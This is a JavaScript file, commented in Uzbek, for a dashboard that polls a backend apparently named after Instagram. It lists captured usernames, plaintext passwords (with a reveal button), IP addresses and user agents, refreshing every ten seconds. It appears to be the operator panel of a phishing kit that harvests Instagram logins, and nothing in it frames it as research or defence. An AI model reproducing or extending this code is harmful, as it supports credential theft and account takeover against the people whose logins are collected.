document.addEventListener('DOMContentLoaded', function() {
    const backendUrl = 'https://instagram-ek8i.onrender.com';
    let updateCounter = 0;
    let allLogs = [];
    
    console.log('Dashboard loaded, backend URL:', backendUrl);

    // Avval test endpoint ni tekshirish
    async function checkBackend() {
        try {
            console.log('Testing backend connection...');
            const testResponse = await fetch(`${backendUrl}/test`);
            const testData = await testResponse.json();
            console.log('Test endpoint response:', testData);
            
            if (testData.status === 'success') {
                console.log('✅ Backend is working, table exists:', testData.table_exists);
                return true;
            } else {
                console.error('❌ Backend test failed:', testData);
                return false;
            }
        } catch (error) {
            console.error('❌ Backend connection failed:', error);
            return false;
        }
    }

    async function loadLogs() {
        try {
            // Avval backend ishlashini tekshirish
            const isBackendOk = await checkBackend();
            if (!isBackendOk) {
                throw new Error('Backend is not responding properly');
            }
            
            // Loading holatini ko'rsatish
            document.getElementById('backendStatus').innerHTML = 
                `<i class="fas fa-circle-notch fa-spin"></i> Yuklanmoqda...`;
            
            console.log('Fetching logs from debug endpoint...');
            
            // DEBUG endpoint ishlatamiz
            const response = await fetch(`${backendUrl}/logs_debug`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                },
                mode: 'cors',
                cache: 'no-cache'
            });

            console.log('Response status:', response.status);
            
            if (!response.ok) {
                // Asosiy endpoint ham sinab ko'rish
                console.log('Debug endpoint failed, trying main endpoint...');
                const mainResponse = await fetch(`${backendUrl}/logs`);
                if (!mainResponse.ok) {
                    throw new Error(`Both endpoints failed: ${response.status}`);
                }
                const data = await mainResponse.json();
                processLogsData(data);
            } else {
                const data = await response.json();
                processLogsData(data);
            }

        } catch (error) {
            console.error('Xatolik:', error);
            showError(error.message);
            
            // 10 soniyadan keyin qayta urinish
            setTimeout(loadLogs, 10000);
        }
    }

    function processLogsData(data) {
        console.log('Logs data received:', data);
        
        if (data.status === 'error') {
            throw new Error(data.error || 'Server error');
        }

        // Status ko'rsatish
        document.getElementById('backendStatus').innerHTML =
            `<i class="fas fa-check-circle" style="color:#10b981"></i> Online`;

        // Statistikani yangilash
        document.getElementById('totalRecords').textContent = data.total || 0;
        document.getElementById('todayRecords').textContent = data.today || 0;
        document.getElementById('lastRecord').textContent = data.last ? 
            new Date(data.last).toLocaleTimeString('uz-UZ') : '--:--';
        document.getElementById('serverTime').textContent = new Date().toLocaleTimeString('uz-UZ');

        // Jadvalni yangilash
        const tbody = document.getElementById('logsBody');
        tbody.innerHTML = '';

        if (data.logs && data.logs.length > 0) {
            allLogs = data.logs;
            data.logs.forEach(log => {
                const row = tbody.insertRow();
                const time = log.timestamp ? new Date(log.timestamp) : new Date();
                
                row.innerHTML = `
                    <td>${log.id || '-'}</td>
                    <td><strong>${log.username || 'N/A'}</strong></td>
                    <td class="password-cell">
                        <span class="password-display">${'•'.repeat((log.password || '').length)}</span>
                        ${log.password ? `<button onclick="togglePassword(this, '${(log.password || '').replace(/'/g, "\\'")}')" 
                                style="margin-left: 10px; background: none; border: 1px solid #334155; color: #94a3b8; padding: 2px 8px; border-radius: 4px; cursor: pointer;">
                            <i class="fas fa-eye"></i>
                        </button>` : ''}
                    </td>
                    <td>${time.toLocaleString('uz-UZ')}</td>
                    <td>${log.ip_address || 'N/A'}</td>
                    <td title="${log.user_agent || ''}">${(log.user_agent || '').substring(0, 40)}...</td>
                `;
            });
        } else {
            tbody.innerHTML = `
                <tr>
                    <td colspan="6" style="text-align:center;padding:40px;color:#94a3b8;">
                        <i class="fas fa-inbox" style="font-size:48px;margin-bottom:15px;opacity:0.5;"></i>
                        <p style="font-size:16px;">Hozircha ma'lumot yo'q</p>
                        <small>${data.message || 'Database is empty'}</small>
                    </td>
                </tr>
            `;
            allLogs = [];
        }

        // Yangilash sonini hisoblash
        updateCounter++;
        document.getElementById('updateTime').textContent = updateCounter;
    }

    function showError(message) {
        document.getElementById('backendStatus').innerHTML =
            `<i class="fas fa-times-circle" style="color:#ef4444"></i> Offline`;
        document.getElementById('logsBody').innerHTML = 
            `<tr>
                <td colspan="6" style="text-align:center;padding:40px;color:#ef4444">
                    <i class="fas fa-exclamation-triangle"></i><br>
                    Serverga ulanmadi<br>
                    <small>${message}</small><br>
                    <button onclick="location.reload()" style="margin-top:15px;padding:8px 16px;background:#3b82f6;color:white;border:none;border-radius:6px;cursor:pointer;">
                        <i class="fas fa-sync-alt"></i> Qayta urinish
                    </button>
                </td>
            </tr>`;
    }

    // Global funksiyalar
    window.togglePassword = function(button, realPassword) {
        if (!realPassword) return;
        
        const passwordSpan = button.parentElement.querySelector('.password-display');
        const icon = button.querySelector('i');
        
        if (passwordSpan.textContent.includes('•')) {
            passwordSpan.textContent = realPassword;
            icon.className = 'fas fa-eye-slash';
        } else {
            passwordSpan.textContent = '•'.repeat(realPassword.length);
            icon.className = 'fas fa-eye';
        }
    };

    window.exportCSV = async function() {
        try {
            alert('Bu funksiya keyinroq qo\'shiladi. Hozir database ishlamoqda.');
            // Keyinroq to'ldiriladi
        } catch (error) {
            console.error('Export error:', error);
            alert('Exportda xatolik!');
        }
    };

    window.clearLogs = async function() {
        alert('Bu funksiya keyinroq qo\'shiladi. Hozir faqat ma\'lumotlarni ko\'rish mumkin.');
    };

    // Dastlabki yuklash
    setTimeout(loadLogs, 1000); // 1 soniya kutish
    
    // Har 10 soniyada yangilash
    setInterval(() => {
        loadLogs();
        updateCounter++;
        document.getElementById('updateTime').textContent = updateCounter;
    }, 10000);
    
    // Vaqtni real-time yangilash
    setInterval(() => {
        document.getElementById('serverTime').textContent = new Date().toLocaleTimeString('uz-UZ');
    }, 1000);
});
